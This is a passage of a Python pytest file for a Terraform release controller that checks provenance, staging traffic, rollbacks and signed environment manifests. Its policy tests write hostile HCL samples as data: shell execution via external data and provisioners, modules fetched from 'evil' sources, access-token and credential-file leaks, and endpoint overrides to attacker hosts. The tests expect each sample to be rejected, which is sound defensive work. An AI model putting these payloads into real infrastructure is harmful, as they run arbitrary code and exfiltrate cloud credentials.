        "Dockerfile.ci", "Dockerfile.ci.dockerignore",
        "Dockerfile.e2e", "Dockerfile.e2e.dockerignore",
    ):
        (trusted / name).write_text("trusted\n")
    instance = ReleaseController(
        source=source,
        artifacts=artifacts,
        tools=tools,
        work_root=tmp_path / "work",
        evidence_bucket="release-evidence",
        controller_digest=CONTROLLER_IMAGE,
        trusted_root=trusted,
        runtime_image="us-central1-docker.pkg.dev/proj/repo/runtime",
    )
    return instance, tools, artifacts


def test_parser_exposes_every_trigger_subcommand():
    parser = build_parser()
    for argv in (
        ["plan", "platform", "--candidate-sha", SHA,
         "--firestore-scope-phase", "disabled"],
        ["apply", "platform", "--plan-uri", "gs://b/p#1",
         "--plan-sha256", "0" * 64],
        ["staging-attest", "--candidate-sha", SHA,
         "--image-digest", IMAGE, "--controller-digest", CONTROLLER_IMAGE],
        ["evidence-manifest", "--evidence-sha", EVIDENCE_SHA,
         "--main-sha", SHA, "--image-digest", IMAGE,
         "--controller-digest", CONTROLLER_IMAGE],
        ["test-only", "--candidate-sha", SHA, "--image-digest", IMAGE],
        ["e2e-image", "--candidate-sha", SHA],
        ["runtime-image", "--candidate-sha", SHA],
        ["runtime-attest", "--candidate-sha", SHA, "--image-digest", IMAGE,
         "--source-build-id", "build-123"],
        ["staging-observe", "--candidate-sha", SHA, "--image-digest", IMAGE],
        ["rollback-observe", "--candidate-sha", SHA, "--image-digest", IMAGE,
         "--baseline-revision", "api-00001-safe", "--baseline-image-digest",
         "reg/app@sha256:" + "4" * 64, "--poll-before-uri", "gs://b/a#1",
         "--poll-after-uri", "gs://b/b#1"],
    ):
        assert parser.parse_args(argv).command == argv[0]


def test_canonical_evidence_validation_has_no_candidate_approval_hash_authority():
    """A canonical evidence manifest must not require deleted markdown hashes."""
    import inspect

    source = inspect.getsource(ReleaseController._validate_evidence_document)
    assert "approval_hash" not in source


def _staging_observation(image_digest=IMAGE):
    return {
        "producer": {
            "name": "kb-rag-system-staging", "revision": "api-00002-candidate",
            "image_digest": image_digest, "ready": True, "handler_mode": "shadow",
            "traffic": [
                {"tag": "candidate", "revision": "api-00002-candidate", "percent": 100},
                {"tag": "baseline", "revision": "api-00001-safe", "percent": 0},
            ],
        },
        "worker": {
            "name": "kb-rag-ticket-worker-staging",
            "revision": "worker-00002-candidate", "image_digest": image_digest,
            "ready": True, "handler_mode": "shadow", "traffic": [],
        },
        "reconciler": {
            "name": "ticket-reconciler-staging", "revision": "generation-2",
            "image_digest": image_digest, "ready": True,
            "handler_mode": "shadow", "traffic": [],
        },
    }


def test_staging_observe_publishes_trusted_revision_evidence(controller, monkeypatch):
    rc, tools, artifacts = controller
    tools.staging_observation = _staging_observation()
    monkeypatch.setenv("BUILD_ID", "observe-build-123")

    result = rc.execute([
        "staging-observe", "--candidate-sha", SHA, "--image-digest", IMAGE,
    ])

    document = json.loads(artifacts.read(result["staging_revisions_uri"]))
    assert document["artifact_type"] == "staging_revisions"
    assert document["result"]["release_phase"] == "shadow"
    assert set(document["result"]["services"]) == {
        "producer", "worker", "reconciler",
    }


def test_staging_observe_rejects_runtime_digest_mismatch(controller, monkeypatch):
    rc, tools, _artifacts = controller
    tools.staging_observation = _staging_observation(
        "reg/app@sha256:" + "9" * 64,
    )
    monkeypatch.setenv("BUILD_ID", "observe-build-123")

    with pytest.raises(ControllerRejected, match="observed staging image digest"):
        rc.execute([
            "staging-observe", "--candidate-sha", SHA, "--image-digest", IMAGE,
        ])


def _rollback_poll(store, phase, *, job_hash="8" * 64):
    execution = "rollback-execution-123"
    document = {
        "schema_version": "1.0", "artifact_type": "rollback_poll_observation",
        "status": "pass", "main_sha": SHA, "candidate_image_digest": IMAGE,
        "execution": execution, "phase": phase, "job_id_sha256": job_hash,
        "terminal_state": "completed", "http_status": 200,
    }
    return store.write(
        f"gs://release-evidence/handle-ticket/e2e/{SHA}/{execution}/"
        f"rollback-{phase}.json",
        json.dumps(document, sort_keys=True).encode(),
    )


def test_rollback_observe_binds_baseline_and_preserved_poll(controller, monkeypatch):
    rc, tools, artifacts = controller
    baseline = "reg/app@sha256:" + "4" * 64
    observation = _staging_observation(baseline)
    observation["producer"].update({
        "revision": "api-00001-safe", "handler_mode": "disabled",
        "traffic": [
            {"tag": "candidate", "revision": "api-00002-candidate", "percent": 0},
            {"tag": "baseline", "revision": "api-00001-safe", "percent": 100},
        ],
    })
    tools.staging_observation = observation
    before = _rollback_poll(artifacts, "before")
    after = _rollback_poll(artifacts, "after")
    monkeypatch.setenv("BUILD_ID", "rollback-build-123")

    result = rc.execute([
        "rollback-observe", "--candidate-sha", SHA, "--image-digest", IMAGE,
        "--baseline-revision", "api-00001-safe",
        "--baseline-image-digest", baseline,
        "--poll-before-uri", before, "--poll-after-uri", after,
    ])

    document = json.loads(artifacts.read(result["rollback_uri"]))
    assert document["result"]["candidate_traffic_percent"] == 0
    assert document["result"]["restored_revision"] == "api-00001-safe"
    assert document["result"]["restored_image_digest"] == baseline
    assert document["result"]["poll_preserved"] is True


def test_candidate_source_rejects_a_different_github_repository():
    with pytest.raises(ControllerRejected, match="trusted repository"):
        GitCandidateSource("https://github.com/attacker/lookalike", FakeToolchain())


def test_production_provenance_rejects_sha_only_present_in_substitutions(monkeypatch):
    class BuildRecordToolchain(ProductionToolchain):
        def run(self, argv, *, cwd=None, capture=False, capture_stderr=False):
            return json.dumps({
                "id": "build-123",
                "status": "WORKING",
                "substitutions": {"_CANDIDATE_SHA": SHA},
                "sourceProvenance": {
                    "resolvedRepoSource": {"commitSha": "f" * 40},
                },
            })

    monkeypatch.setenv("BUILD_ID", "build-123")
    with pytest.raises(ControllerRejected, match="resolved source"):
        BuildRecordToolchain().verify_provenance(IMAGE, SHA)


def test_production_provenance_rejects_current_working_build(monkeypatch):
    class WorkingBuildToolchain(ProductionToolchain):
        def run(self, argv, *, cwd=None, capture=False, capture_stderr=False):
            return json.dumps({
                "id": "build-123", "status": "WORKING",
                "sourceProvenance": {"resolvedRepoSource": {"commitSha": SHA}},
            })

    monkeypatch.setenv("BUILD_ID", "build-123")
    with pytest.raises(ControllerRejected, match="SUCCESS"):
        WorkingBuildToolchain().verify_provenance(IMAGE, SHA)


def test_production_toolchain_normalizes_authenticated_cloud_run_observation(monkeypatch):
    class CloudRunToolchain(ProductionToolchain):
        def run(self, argv, *, cwd=None, capture=False, capture_stderr=False):
            del cwd, capture, capture_stderr
            name = argv[4]
            is_job = argv[3] == "jobs"
            body = {
                "metadata": {"name": name, "generation": 7},
                "spec": {"template": {"containers": [{
                    "image": IMAGE,
                    "env": [{"name": "TICKET_HANDLER_MODE", "value": "shadow"}],
                }]}},
                "status": {"conditions": [{"type": "Ready", "status": "True"}]},
            }
            if not is_job:
                body["status"].update({
                    "latestReadyRevisionName": name + "-00007-abc",
                    "traffic": [{
                        "tag": "candidate", "revisionName": name + "-00007-abc",
                        "percent": 100,
                    }],
                })
            return json.dumps(body)

    monkeypatch.setenv("PROJECT_ID", PROJECT)
    observed = CloudRunToolchain().observe_staging()

    assert observed["producer"]["revision"] == "kb-rag-system-staging-00007-abc"
    assert observed["worker"]["ready"] is True
    assert observed["reconciler"]["revision"] == "generation-7"
    assert {item["image_digest"] for item in observed.values()} == {IMAGE}


def test_production_gcloud_reads_pin_exact_project_and_regions(monkeypatch):
    class RecordingToolchain(ProductionToolchain):
        def __init__(self):
            self.calls = []

        def run(self, argv, *, cwd=None, capture=False, capture_stderr=False):
            del cwd, capture, capture_stderr
            self.calls.append(tuple(argv))
            if "scan" in argv:
                return "projects/rag-kb-system/locations/us/scans/scan-1\n"
            if "list-vulnerabilities" in argv:
                return "[]"
            if "images" in argv:
                return json.dumps({"digest": "sha256:" + "c" * 64})
            return "{}"

    monkeypatch.setenv("PROJECT_ID", PROJECT)
    tools = RecordingToolchain()
    tools.describe_build("build-1")
    tools.describe_trigger("trigger-1")
    tools.describe_image(IMAGE)
    tools.verify_scan(IMAGE)

    for call in tools.calls:
        assert "--project=rag-kb-system" in call
    build_call = next(call for call in tools.calls if call[1:3] == ("builds", "describe"))
    trigger_call = next(call for call in tools.calls if "triggers" in call)
    image_calls = [call for call in tools.calls if "images" in call]
    assert "--region=global" in build_call
    assert "--region=global" in trigger_call
    assert all(
        "--location=us-central1" in call
        for call in image_calls if "describe" in call
    )
    assert all(
        "--location=us" in call
        for call in image_calls if "describe" not in call
    )


def test_production_scan_rejects_cross_project_scan_name():
    class CrossProjectScanToolchain(ProductionToolchain):
        def run(self, argv, **_kwargs):
            if "scan" in argv:
                return "projects/attacker-project/locations/us/scans/scan-1\n"
            raise AssertionError("cross-project scan must fail before result lookup")

    with pytest.raises(ControllerRejected, match="scan identifier"):
        CrossProjectScanToolchain().verify_scan(IMAGE)


def test_controller_rejects_any_other_well_formed_project(candidate, tmp_path):
    with pytest.raises(ControllerRejected, match="exact project"):
        ReleaseController(
            source=LocalCandidateSource(candidate), artifacts=MemoryArtifactStore(),
            tools=FakeToolchain(), work_root=tmp_path / "other-project",
            evidence_bucket="release-evidence", project_id="attacker-project",
        )


def test_write_only_gcs_upload_returns_generation_without_post_write_get():
    class WriteOnlyToolchain(Toolchain):
        def __init__(self):
            self.calls = []

        def run(self, argv, *, cwd=None, capture=False, capture_stderr=False):
            self.calls.append(tuple(argv))
            if argv[:3] == ["gcloud", "storage", "cp"]:
                return "Created: gs://release-evidence/path/object.json#1700000000001\n"
            raise AssertionError("write-only identity cannot describe the uploaded object")

    tools = WriteOnlyToolchain()
    uri = GCSArtifactStore(tools).write(
        "gs://release-evidence/path/object.json", b"trusted",
    )

    assert uri == "gs://release-evidence/path/object.json#1700000000001"
    assert len(tools.calls) == 1
    assert "--if-generation-match=0" in tools.calls[0]
    assert "--print-created-message" in tools.calls[0]
    assert "--project=rag-kb-system" in tools.calls[0]


@pytest.mark.parametrize("malicious", [
    'data "external" "escape" { program = ["sh", "-c", "id"] }\n',
    'resource "null_resource" "escape" { provisioner "local-exec" {} }\n',
    'resource "terraform_data" "escape" { provisioner "remote-exec" {} }\n',
    'module "escape" { source = "git::https://evil/repo.git" }\n',
    'terraform { required_providers { evil = { source = "evil/provider" } } }\n',
    'module "escape" { source = "../../../../../candidate-code" }\n',
])
def test_terraform_policy_rejects_execution_escape_hatches(candidate, malicious):
    target = candidate / "infra" / "terraform" / "live" / "platform" / "evil.tf"
    target.write_text(malicious)
    with pytest.raises(ControllerRejected):
        validate_terraform_tree(candidate)


@pytest.mark.parametrize(
    ("malicious", "message"),
    [
        (
            'data "google_client_config" "leak" {}\n'
            'output "leak" {\n'
            '  value = nonsensitive(data.google_client_config.leak.access_token)\n'
            '}\n',
            "data source",
        ),
        (
            'variable "candidate_secret" { sensitive = true }\n'
            'output "leak" { value = nonsensitive(var.candidate_secret) }\n',
            "declassification",
        ),
        (
            'data /* candidate comment */ "google_client_config" "leak" {}\n',
            "data source",
        ),
        (
            'resource "google_storage_bucket_object" "leak" {\n'
            '  name = "leak"\n  bucket = "release-evidence"\n'
            '  content = "candidate"\n}\n',
            "resource type",
        ),
        (
            'import {\n'
            '  to = google_storage_bucket.evidence\n'
            '  id = "attacker-selected-bucket"\n'
            '}\n',
            "import block",
        ),
        (
            'output "leak" { value = file("/builder/home/.config/gcloud/configurations/config_default") }\n',
            "filesystem function",
        ),
        (
            'provider "google" {\n'
            '  storage_custom_endpoint = "https://attacker.invalid"\n'
            '}\n',
            "endpoint override",
        ),
        (
            'provider "google" { universe_domain = "attacker.invalid" }\n',
            "endpoint override",
        ),
    ],
)
def test_terraform_policy_rejects_preplan_reads_and_declassification(
    controller, malicious, message,
):
    """Candidate HCL must be rejected before Terraform gets credentials."""
    rc, tools, _artifacts = controller
    target = (
        rc.source.root / "infra" / "terraform" / "live" / "platform" /
        "credential-leak.tf"
    )
    target.write_text(malicious, encoding="utf-8")

    with pytest.raises(ControllerRejected, match=message):
        rc.execute([
            "plan", "platform", "--candidate-sha", SHA,
            "--firestore-scope-phase", "disabled",
        ])

    assert not any(call and call[0] == "terraform" for call in tools.calls)


def test_terraform_policy_allows_only_reviewed_project_metadata_data(candidate):
    target = (
        candidate / "infra" / "terraform" / "live" / "platform" /
        "pipeline_iam.tf"
    )
    target.write_text(
        'data "google_project" "current" {\n'
        '  project_id = var.project_id\n'
        '}\n',
        encoding="utf-8",
    )

    validate_terraform_tree(candidate)


def test_terraform_policy_allows_only_exact_reviewed_import(candidate):
    target = (
        candidate / "infra" / "terraform" / "live" / "platform" /
        "imports.tf"
    )
    target.write_text(
        'import {\n'
        '  to = google_artifact_registry_repository.images\n'
        '  id = "projects/${var.project_id}/locations/${var.region}/repositories/kb-rag"\n'
        '}\n',
        encoding="utf-8",
    )

    validate_terraform_tree(candidate)


def test_terraform_policy_rejects_preseeded_provider_cache(candidate):
    provider = (
        candidate / "infra" / "terraform" / "live" / "platform" /
        ".terraform" / "providers" / "evil-provider"
    )
    provider.parent.mkdir(parents=True)
    provider.write_bytes(b"candidate executable")

    with pytest.raises(ControllerRejected, match="Terraform artifact"):
        validate_terraform_tree(candidate)


@pytest.mark.parametrize("relative_name", [
    "evil.tf.json",
    "tests/evil.tftest.json",
    "override.tf",
    "custom_override.tf",
    "override.tf.json",
    "custom_override.tf.json",
    "terraform.tfvars",
    "terraform.tfvars.json",
    "evil.auto.tfvars",
    "evil.auto.tfvars.json",
])
def test_terraform_policy_rejects_implicit_unreviewed_inputs(
    candidate, relative_name,
):
    target = (
        candidate / "infra" / "terraform" / "live" / "platform" /
        relative_name
    )
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text("{}\n", encoding="utf-8")

    with pytest.raises(ControllerRejected, match="implicit"):
        validate_terraform_tree(candidate)


def test_terraform_policy_rejects_backend_declaration_outside_exact_backend_file(
    candidate,
):
    target = (
        candidate / "infra" / "terraform" / "live" / "platform" / "evil.tf"
    )
    target.write_text(
        'terraform { backend "local" {} }\n', encoding="utf-8"
    )

    with pytest.raises(ControllerRejected, match="backend"):
        validate_terraform_tree(candidate)


def test_terraform_policy_rejects_apply_capable_test(candidate):
    test_file = (
        candidate / "infra" / "terraform" / "live" / "platform" /
        "tests" / "escape.tftest.hcl"
    )
    test_file.parent.mkdir(exist_ok=True)
    test_file.write_text('run "escape" { command = apply }\n')

    with pytest.raises(ControllerRejected, match="apply-capable"):
        validate_terraform_tree(candidate)


def test_terraform_policy_rejects_test_whose_default_command_is_apply(candidate):
    test_file = (
        candidate / "infra" / "terraform" / "live" / "platform" /
        "tests" / "default-apply.tftest.hcl"
    )
    test_file.parent.mkdir(exist_ok=True)
    test_file.write_text(
        'run "escape" {\n  assert { condition = true error_message = "x" }\n}\n'
    )

    with pytest.raises(ControllerRejected, match="apply-capable"):
        validate_terraform_tree(candidate)


def test_terraform_policy_allows_apply_only_with_complete_mock_provider_set(candidate):
    test_file = (
        candidate / "infra" / "terraform" / "live" / "platform" /
        "tests" / "mocked-apply.tftest.hcl"
    )
    test_file.parent.mkdir(exist_ok=True)
    test_file.write_text(
        'mock_provider "google" {}\nmock_provider "google-beta" {}\n'
        'run "safe" { command = apply }\n'
    )

    validate_terraform_tree(candidate)


@pytest.mark.parametrize("source", ["https://attacker.invalid/module", "../escape"])
def test_terraform_policy_rejects_test_module_source_escape(candidate, source):
    test_file = (
        candidate / "infra" / "terraform" / "live" / "platform" /
        "tests" / "source-escape.tftest.hcl"
    )
    test_file.parent.mkdir(exist_ok=True)
    test_file.write_text(
        'mock_provider "google" {}\nmock_provider "google-beta" {}\n'
        f'run "escape" {{ command = apply module {{ source = "{source}" }} }}\n'
    )

    with pytest.raises(ControllerRejected, match="unapproved Terraform test source"):
        validate_terraform_tree(candidate)


def test_controller_rejects_candidate_provider_lock_drift(controller):
    rc, _tools, _artifacts = controller
    lock = (
        rc.source.root / "infra" / "terraform" / "live" / "platform" /
        ".terraform.lock.hcl"
    )
    lock.write_text(lock.read_text().replace('version = "5.45.2"', 'version = "5.46.0"'))

    with pytest.raises(ControllerRejected, match="reviewed controller input"):
        rc.execute([
            "plan", "platform", "--candidate-sha", SHA,
            "--firestore-scope-phase", "disabled",
        ])


def test_plan_then_apply_exact_binary_and_reject_tampering(controller):
    rc, tools, artifacts = controller
    planned = rc.execute([
        "plan", "platform", "--candidate-sha", SHA,
        "--firestore-scope-phase", "disabled",
    ])
    assert planned["plan_uri"].endswith("#1")
    assert planned["plan_sha256"] == _sha256(b"trusted-plan")

    applied = rc.execute([
        "apply", "platform", "--plan-uri", planned["plan_uri"],
        "--plan-sha256", planned["plan_sha256"],
        "--gate-receipts", _install_gate_receipts(tools, artifacts, planned),
    ])
    assert applied["status"] == "applied"
    assert applied["platform_outputs_uri"].endswith("#1")
    outputs = json.loads(artifacts.read(applied["platform_outputs_uri"]))
    assert outputs["artifact_type"] == "platform_outputs"
    assert len(outputs["terraform_outputs_hash"]) == 64
    assert applied["platform_outputs_hash"] == outputs["manifest_hash"]
    assert any(call[:2] == ("terraform", "apply") for call in tools.calls)

    artifacts.replace_for_test(planned["plan_uri"], b"tampered")
    with pytest.raises(ControllerRejected, match="hash"):
        rc.execute([
            "apply", "platform", "--plan-uri", planned["plan_uri"],
            "--plan-sha256", planned["plan_sha256"],
        ])


def test_apply_rejects_tampered_source_bundle(controller):
    rc, _tools, artifacts = controller
    planned = rc.execute([
        "plan", "platform", "--candidate-sha", SHA,
        "--firestore-scope-phase", "disabled",
    ])
    manifest = json.loads(artifacts.read(planned["plan_manifest_uri"]))
    artifacts.replace_for_test(manifest["bundle_uri"], b"tampered-source")

    with pytest.raises(ControllerRejected, match="bundle"):
        rc.execute([
            "apply", "platform", "--plan-uri", planned["plan_uri"],
            "--plan-sha256", planned["plan_sha256"],
        ])


def test_plan_rejects_backend_bucket_crossing(candidate, controller):
    backend = candidate / "infra" / "terraform" / "live" / "platform" / "backend.tf"
    backend.write_text(
        'terraform { backend "gcs" { bucket = '
        '"rag-kb-system-tfstate-production-900340137010" } }\n'
    )
    rc, _tools, _artifacts = controller
    with pytest.raises(ControllerRejected, match="backend bucket"):
        rc.execute([
            "plan", "platform", "--candidate-sha", SHA,
            "--firestore-scope-phase", "disabled",
        ])


def test_plan_rejects_backend_prefix_crossing(candidate, controller):
    backend = candidate / "infra" / "terraform" / "live" / "platform" / "backend.tf"
    backend.write_text(
        'terraform { backend "gcs" { bucket = '
        '"rag-kb-system-tfstate-platform-900340137010" prefix = "other" } }\n'
    )
    rc, _tools, _artifacts = controller
    with pytest.raises(ControllerRejected, match="backend prefix"):
        rc.execute([
            "plan", "platform", "--candidate-sha", SHA,
            "--firestore-scope-phase", "disabled",
        ])


def test_terraform_init_cannot_rewrite_provider_lock(controller):
    rc, tools, _artifacts = controller
    rc.execute([
        "plan", "platform", "--candidate-sha", SHA,
        "--firestore-scope-phase", "disabled",
    ])
    init = next(call for call in tools.calls if call[:2] == ("terraform", "init"))
    assert "-lockfile=readonly" in init


def test_plan_pins_canonical_project_and_region(controller):
    rc, tools, _artifacts = controller
    rc.execute([
        "plan", "platform", "--candidate-sha", SHA,
        "--firestore-scope-phase", "disabled",
    ])

    plan = next(call for call in tools.calls if call[:2] == ("terraform", "plan"))
    assert "-var=project_id=rag-kb-system" in plan
    assert "-var=region=us-central1" in plan


def test_environment_plan_requires_verified_platform_outputs_before_terraform(controller):
    rc, tools, _artifacts = controller
    with pytest.raises(ControllerRejected, match="platform outputs"):
        rc.execute([
            "plan", "staging", "--candidate-sha", SHA,
            "--image-digest", IMAGE, "--release-phase", "infra_only",
        ])
    assert not any(call[0] == "terraform" for call in tools.calls)


def test_environment_plan_injects_bound_platform_outputs_tfvars(controller):
    rc, tools, artifacts = controller
    outputs_uri = _write_platform_outputs(artifacts)
    environment_uri = _write_environment_tfvars(artifacts, "staging")
    planned = rc.execute([
        "plan", "staging", "--candidate-sha", SHA,
        "--image-digest", IMAGE, "--release-phase", "infra_only",
        "--platform-outputs-uri", outputs_uri,
        "--environment-tfvars-uri", environment_uri,
    ])
    command = next(call for call in tools.calls if call[:2] == ("terraform", "plan"))
    tfvars_arg = next(part for part in command if part.startswith("-var-file="))
    tfvars = json.loads(Path(tfvars_arg.removeprefix("-var-file=")).read_text())
    assert tfvars["runtime_service_accounts"]["ticket-worker-stg"] == (
        f"ticket-worker-stg@{PROJECT}.iam.gserviceaccount.com"
    )
    assert tfvars["producer_core_env"] == {}
    manifest = json.loads(artifacts.read(planned["plan_manifest_uri"]))
    assert manifest["platform_outputs_uri"] == outputs_uri
    assert manifest["platform_outputs_hash"] == _sha256(artifacts.read(outputs_uri))
    assert manifest["environment_tfvars_uri"] == environment_uri
    assert manifest["environment_tfvars_hash"] == _sha256(
        json.dumps(tfvars, sort_keys=True, separators=(",", ":")).encode()
    )


def test_staging_infra_only_accepts_empty_image_but_explicit_minimal_inputs(controller):
    rc, tools, artifacts = controller
    outputs_uri = _write_platform_outputs(artifacts)
    environment_uri = _write_environment_tfvars(artifacts, "staging")
    planned = rc.execute([
        "plan", "staging", "--candidate-sha", SHA,
        "--release-phase", "infra_only",
        "--platform-outputs-uri", outputs_uri,
        "--environment-tfvars-uri", environment_uri,
    ])
    manifest = json.loads(artifacts.read(planned["plan_manifest_uri"]))
    assert manifest["image_digest"] == ""
    command = next(call for call in tools.calls if call[:2] == ("terraform", "plan"))
    assert "-var=image_digest=" in command


def test_active_shadow_derives_rate_and_requires_exact_e2e_lineage(controller):
    rc, tools, artifacts = controller
    outputs_uri = _write_platform_outputs(artifacts)
    environment_uri = _write_environment_tfvars(artifacts, "staging", active=True)
    rc.execute([
        "plan", "staging", "--candidate-sha", SHA,
        "--image-digest", IMAGE, "--release-phase", "shadow",
        "--platform-outputs-uri", outputs_uri,
        "--environment-tfvars-uri", environment_uri,
    ])
    command = next(call for call in tools.calls if call[:2] == ("terraform", "plan"))
    tfvars = json.loads(Path(
        next(part for part in command if part.startswith("-var-file=")).split("=", 1)[1]
    ).read_text())
    assert tfvars["shadow_sample_rate"] == 100
    assert tfvars["e2e_job"]["image_digest"] != IMAGE
    assert "producer_url" not in tfvars["e2e_job"]


@pytest.mark.parametrize(
    ("mutation", "message"),
    [
        (
            lambda env: env.__setitem__("LLM_ROUTE_EXTRACT_INQUIRIES", "other-1"),
            "route model",
        ),
        (
            lambda env: env.__setitem__(
                "TICKET_LLM_PRICING_JSON",
                '{"pricing_as_of":"2026-07-20",'
                '"source":"openai-google-official-public-pricing","models":{}}',
            ),
            "pricing",
        ),
        (
            lambda env: env.__setitem__(
                "TICKET_LLM_PRICING_JSON",
                '{"pricing_as_of":"2026-07-21",'
                '"source":"openai-google-official-public-pricing","models":{'
                '"openai:gpt-5.5":{"input_usd_per_million":5,'
                '"output_usd_per_million":30}}}',
            ),
            "pricing",
        ),
        (
            lambda env: env.__setitem__(
                "TICKET_LLM_PRICING_JSON",
                '{"pricing_as_of":"2026-07-21",'
                '"source":"openai-google-official-public-pricing","models":{'
                '"openai:gpt-5.5":{"input_usd_per_million":true,'
                '"output_usd_per_million":30},'
                '"gemini:gemini-2.5-pro":{"input_usd_per_million":1.25,'
                '"output_usd_per_million":10}}}',
            ),
            "pricing",
        ),
    ],
)
def test_active_environment_rejects_unreviewed_llm_contract(
    controller, mutation, message,
):
    rc, _tools, artifacts = controller
    environment_uri = _write_environment_tfvars(artifacts, "staging", active=True)
    body = json.loads(artifacts.read(environment_uri))
    body["tfvars"]["producer_core_env"] = dict(
        body["tfvars"]["producer_core_env"]
    )
    mutation(body["tfvars"]["producer_core_env"])
    body.pop("manifest_hash")
    artifacts.replace_for_test(environment_uri, _signed_manifest(body))

    with pytest.raises(ControllerRejected, match=message):
        rc._environment_tfvars(  # noqa: SLF001
            "staging", environment_uri, candidate_sha=SHA,
            release_phase="shadow", image_digest=IMAGE,
        )


def test_staging_dark_bootstrap_allows_services_before_baseline_and_e2e(controller):
    rc, _tools, artifacts = controller
    environment_uri = _write_environment_tfvars(artifacts, "staging", active=True)
    body = json.loads(artifacts.read(environment_uri))
    body["tfvars"]["e2e_job"] = {
        "enabled": False, "image_digest": "", "service_account_email": "",
        "nonsecret_env": {}, "secret_version_refs": {},
    }
    body["tfvars"]["e2e_secret_containers"] = {}
    body["tfvars"]["producer_baseline_revision"] = ""
    dark_keys = {
        "API_KEY", "FORUSBOTS_AUTH_TOKEN", "OPENAI_API_KEY",
        "PINECONE_API_KEY",
    }
    refs = body["tfvars"]["secret_version_refs"]
    body["tfvars"]["secret_version_refs"] = {
        key: refs[key] for key in dark_keys
    }
    containers = body["tfvars"]["secret_containers"]
    containers["ids"] = {
        key: key.lower().replace("_", "-") for key in dark_keys
    }
    containers["accessor_roles"] = {
        "API_KEY": ["producer"],
        "FORUSBOTS_AUTH_TOKEN": ["worker"],
        "OPENAI_API_KEY": ["producer", "worker"],
        "PINECONE_API_KEY": ["producer", "worker"],
    }
    body.pop("manifest_hash")
    artifacts.replace_for_test(environment_uri, _signed_manifest(body))

    encoded, _, _ = rc._environment_tfvars(  # noqa: SLF001
        "staging", environment_uri, candidate_sha=SHA,
        release_phase="dark_100", image_digest=IMAGE,
    )

    assert json.loads(encoded)["e2e_job"]["enabled"] is False


def test_staging_dark_accepts_exact_role_scoped_runtime_secret_inventory(controller):
    rc, _tools, artifacts = controller
    environment_uri = _write_environment_tfvars(artifacts, "staging", active=True)
    body = json.loads(artifacts.read(environment_uri))
    dark_keys = {
        "API_KEY", "FORUSBOTS_AUTH_TOKEN", "OPENAI_API_KEY",
        "PINECONE_API_KEY",
    }
    refs = body["tfvars"]["secret_version_refs"]
    body["tfvars"]["secret_version_refs"] = {
        key: refs[key] for key in dark_keys
    }
    containers = body["tfvars"]["secret_containers"]
    containers["ids"] = {
        key: key.lower().replace("_", "-") for key in dark_keys
    }
    containers["accessor_roles"] = {
        "API_KEY": ["producer"],
        "FORUSBOTS_AUTH_TOKEN": ["worker"],
        "OPENAI_API_KEY": ["producer", "worker"],
        "PINECONE_API_KEY": ["producer", "worker"],
    }
    body["tfvars"]["e2e_job"] = {
        "enabled": False, "image_digest": "", "service_account_email": "",
        "nonsecret_env": {}, "secret_version_refs": {},
    }
    body["tfvars"]["e2e_secret_containers"] = {}
    body["tfvars"]["producer_baseline_revision"] = ""
    body.pop("manifest_hash")
    artifacts.replace_for_test(environment_uri, _signed_manifest(body))

    encoded, _, _ = rc._environment_tfvars(  # noqa: SLF001
        "staging", environment_uri, candidate_sha=SHA,
        release_phase="dark_100", image_digest=IMAGE,
    )

    decoded = json.loads(encoded)
    assert set(decoded["secret_version_refs"]) == dark_keys
    assert decoded["secret_containers"]["accessor_roles"] == {
        "API_KEY": ["producer"],
        "FORUSBOTS_AUTH_TOKEN": ["worker"],
        "OPENAI_API_KEY": ["producer", "worker"],
        "PINECONE_API_KEY": ["producer", "worker"],
    }


def test_production_manifest_accepts_observed_startup_cpu_boost(controller):
    rc, _tools, artifacts = controller
    environment_uri = _write_environment_tfvars(
        artifacts, "production", active=True,
    )
    body = json.loads(artifacts.read(environment_uri))
    body["tfvars"]["producer_startup_cpu_boost"] = True
    body.pop("manifest_hash")
    artifacts.replace_for_test(environment_uri, _signed_manifest(body))

    encoded, _, _ = rc._environment_tfvars(  # noqa: SLF001
        "production", environment_uri, candidate_sha=SHA,
        release_phase="full", image_digest=IMAGE,
    )

    assert json.loads(encoded)["producer_startup_cpu_boost"] is True


def test_production_manifest_rejects_disabled_startup_cpu_boost(controller):
    rc, _tools, artifacts = controller
    environment_uri = _write_environment_tfvars(
        artifacts, "production", active=True,
    )
    body = json.loads(artifacts.read(environment_uri))
    body["tfvars"]["producer_startup_cpu_boost"] = False
    body.pop("manifest_hash")
    artifacts.replace_for_test(environment_uri, _signed_manifest(body))

    with pytest.raises(ControllerRejected, match="startup_cpu_boost"):
        rc._environment_tfvars(  # noqa: SLF001
            "production", environment_uri, candidate_sha=SHA,
            release_phase="full", image_digest=IMAGE,
        )


@pytest.mark.parametrize(
    ("environment", "mutation", "message"),
    [
        ("staging", "missing_api_key", "secret ref"),
        ("staging", "worker_gets_api_key", "accessor roles"),
        ("production", "fault_secret", "secret ref"),
    ],
)
def test_active_environment_rejects_inexact_startup_secret_inventory(
        controller, environment, mutation, message):
    rc, _tools, artifacts = controller
    environment_uri = _write_environment_tfvars(artifacts, environment, active=True)
    body = json.loads(artifacts.read(environment_uri))
    refs = body["tfvars"]["secret_version_refs"]
    containers = body["tfvars"]["secret_containers"]
    if mutation == "missing_api_key":
        refs.pop("API_KEY")
        containers["ids"].pop("API_KEY")
        containers["accessor_roles"].pop("API_KEY")
    elif mutation == "worker_gets_api_key":
        containers["accessor_roles"]["API_KEY"] = ["producer", "worker"]
    else:
        refs["TICKET_FAULT_SIGNING_SECRET"] = (
            f"projects/{PROJECT}/secrets/fault/versions/1"
        )
        containers["ids"]["TICKET_FAULT_SIGNING_SECRET"] = "fault"
        containers["accessor_roles"]["TICKET_FAULT_SIGNING_SECRET"] = ["producer"]
    body.pop("manifest_hash")
    artifacts.replace_for_test(environment_uri, _signed_manifest(body))
    with pytest.raises(ControllerRejected, match=message):
        rc._environment_tfvars(  # noqa: SLF001 - direct trust-boundary contract
            environment, environment_uri, candidate_sha=SHA,
            release_phase="shadow" if environment == "staging" else "full",
            image_digest=IMAGE,
        )


def test_environment_manifest_rejects_obsolete_aws_wif_input(controller):
    rc, _tools, artifacts = controller
    environment_uri = _write_environment_tfvars(artifacts, "staging", active=True)
    body = json.loads(artifacts.read(environment_uri))
    body["tfvars"]["n8n_aws_account_id"] = "123456789012"
    body.pop("manifest_hash")
    artifacts.replace_for_test(environment_uri, _signed_manifest(body))

    with pytest.raises(ControllerRejected, match="unapproved staging tfvars"):
        rc._environment_tfvars(  # noqa: SLF001 - direct trust-boundary contract
            "staging", environment_uri, candidate_sha=SHA,
